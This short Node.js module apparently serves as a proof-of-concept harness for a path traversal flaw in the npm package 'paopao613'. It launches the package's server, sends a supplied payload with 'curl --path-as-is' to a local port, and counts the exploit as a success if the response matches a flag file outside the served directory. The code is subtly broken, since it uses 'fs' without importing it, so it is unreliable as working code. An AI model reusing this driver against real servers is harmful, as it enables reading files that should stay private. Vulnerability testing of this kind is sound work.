function exploitFunction(payload) {
  const path = require("path");
  const { sleep } = require("sleep");
  const { exec } = require("child_process");

  const pathToFlag = path.resolve(__dirname, "../flag.html");

  // Simulate starting the server
  const server = "node ./node_modules/paopao613/index.js";

  // Execute the server command
  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    // Sleep for 2 seconds to ensure the server is up
    sleep.sleep(2);

    // Simulate the HTTP request with the payload
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

    // Execute the curl command
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing curl: ${error}`);
        return;
      }

      // Read the flag file content
      const hostsFile = fs.readFileSync(pathToFlag).toString();

      // Compare the output with the flag file content
      if (stdout === hostsFile) {
        console.log("Exploit successful!");
      } else {
        console.error("Exploit failed!");
      }
    });
  });
}

module.exports = { exploitFunction };